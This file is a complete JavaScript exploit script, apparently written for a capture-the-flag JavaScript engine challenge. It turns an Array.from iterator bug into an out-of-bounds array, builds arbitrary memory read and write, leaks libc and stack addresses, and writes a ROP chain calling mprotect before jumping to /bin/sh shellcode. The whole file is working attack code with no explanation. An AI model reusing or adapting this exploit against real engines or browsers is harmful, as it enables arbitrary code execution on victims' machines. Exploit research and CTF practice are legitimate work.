class Memory {
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    d2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2d(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var mem = new Memory();

var bufs = [];
var objs = [];

var oobArray = [1.1];
var maxSize = 1028 * 8;
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
        {
            counter : 0,
            next() {
                let result = 1.1;
                this.counter++;
                if (this.counter > maxSize) {
                    oobArray.length = 1;
                    for (let i = 0; i < 100; i++){
                        bufs.push(new ArrayBuffer(0x1234));
                        let obj = {'a': 0x4321, 'b': 0x9999};
                        objs.push(obj);
                    }
                    return {done: true};
                } else {
                    return {value: result, done: false};
                }
            }
        }
    ) });

let buf_offset = 0;
for(let i = 0; i < maxSize; i++){
    let val = mem.d2u(oobArray[i]);
    if(val === 0x123400000000){
        console.log("buf_offset: " + i.toString());
        buf_offset = i;
        oobArray[i] = mem.u2d(0x121200000000);
        oobArray[i+3] = mem.u2d(0x1212);
        break;
    }
}

let obj_offset = 0;
for(let i = 0; i < maxSize; i++){
    let val = mem.d2u(oobArray[i]);
    if(val === 0x432100000000){
        console.log("obj_offset: " + i.toString());
        obj_offset = i;
        oobArray[i] = mem.u2d(0x567800000000);
        break;
    }
}

let controllable_buf_idx = 0;
for(let i = 0; i < bufs.length; i++){
    let val = bufs[i].byteLength;
    if(val === 0x1212){
        console.log("[*] Found controllable buf at idx: " + i.toString());
        controllable_buf_idx = i
        break;
    }
}

let controllable_obj_idx = 0;
for(let i = 0; i < objs.length; i++){
    let val = objs[i].a;
    if(val === 0x5678){
        console.log("[*] Found controllable obj at idx: " + i.toString());
        controllable_obj_idx = i;
        break;
    }
}

var heap_addr = mem.d2u(oobArray[buf_offset + 1]) - 0x10;
console.log("heap_addr: 0x" + heap_addr.toString(16));

class arbitraryRW {
    constructor(buf_offset, buf_idx, obj_offset, obj_idx){
        this.buf_offset = buf_offset;
        this.buf_idx = buf_idx;
        this.obj_offset = obj_offset;
        this.obj_idx = obj_idx;
    }
    leak_obj(obj){
        objs[this.obj_idx].a = obj;
        return mem.d2u(oobArray[this.obj_offset]) - 1;
    }

    read(addr){
        let idx = this.buf_offset;
        oobArray[idx + 1] = mem.u2d(addr);
        oobArray[idx + 2] = mem.u2d(addr);

        let tmp = new Float64Array(bufs[this.buf_idx],0,0x10);
        return mem.d2u(tmp[0]);
    }
    write(addr, val){
        let idx = this.buf_offset;
        oobArray[idx + 1] = mem.u2d(addr);
        oobArray[idx + 2] = mem.u2d(addr);
        let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10);
        tmp.set([mem.u2d(val)]);
    }
}

var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);

let curr_chunk = heap_addr;
let searched = 0;
for(let i = 0; i < 0x5000; i++){
    let size = arw.read(curr_chunk + 0x8);
    let prev_size = arw.read(curr_chunk);
    if(size != 0){
        let tmp_ptr = curr_chunk - prev_size;
        let fd = arw.read(tmp_ptr + 0x10);
        let bk = arw.read(tmp_ptr + 0x18);
        if(parseInt(fd / 0x10000000000) === 0x7f){
            searched = fd;
            break;
        }else if(parseInt(bk / 0x10000000000) === 0x7f){
            searched = bk;
            break;
        }
    } else if(size < 0x20) {
        break;
    }

    // if(size != 0 && size % 2 === 0 && prev_size <= 0x3f0){
    //     let tmp_ptr = curr_chunk - prev_size;
    //     let fd = arw.read(tmp_ptr + 0x10);
    //     let bk = arw.read(tmp_ptr + 0x18);
    //     console.log("leak fd: " + fd.toString(16));
    //     console.log("leak bk: " + bk.toString(16));
    //     if(parseInt(fd / 0x10000000000) === 0x7f){
    //         searched = fd;
    //         break;
    //     }else if(parseInt(bk / 0x10000000000) === 0x7f){
    //         searched = bk;
    //         break;
    //     }else if (size < 0x20){
    //         break;
    //     }
        size = parseInt(size / 8) * 8;
        curr_chunk += size;
}


if(searched !== 0){
    console.log("[*] leak libc is: " + searched.toString(16));
    var libc_base = parseInt(searched - 3952968);
    console.log("[*] libc base is: " + libc_base.toString(16));
}


let environ_addr = libc_base + 0x0000000003C6F38;
let stack_addr = arw.read(environ_addr);
console.log("[*] stack addr is 0x" + stack_addr.toString(16));

let sc = [0x50,0x48,0x31,0xc0,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xb0,0x3b,0x0f,0x05]
let shellcode = new Uint8Array(2048);

for(let i = 0; i < sc.length; i++){
    shellcode[i] = sc[i];
}
let shellcode_addr = arw.read(arw.leak_obj(shellcode) + 0x68);
console.log("[*] shellcode is: 0x" + shellcode_addr.toString(16));


let mprotect = libc_base + 0x0000000000101770;
let pop_rdi = libc_base + 0x0000000000021102;
let pop_rsi = libc_base + 0x00000000000202e8;
let pop_rdx = libc_base + 0x0000000000001b92;
let retn = libc_base + 0x000000000007EF0D;

let rop = [
    pop_rdi,
    parseInt(shellcode_addr/0x1000) * 0x1000,
    pop_rsi,
    4096,
    pop_rdx,
    7,
    mprotect,
    shellcode_addr
    ];

let rop_start = stack_addr - 8 * (rop.length + 1);


for(let i = 0; i < rop.length; i++){
    arw.write(rop_start + 8 * i, rop[i]);
}

for(let i = 0; i < 0x100; i++){
    rop_start -= 8;
    arw.write(rop_start, retn);
}


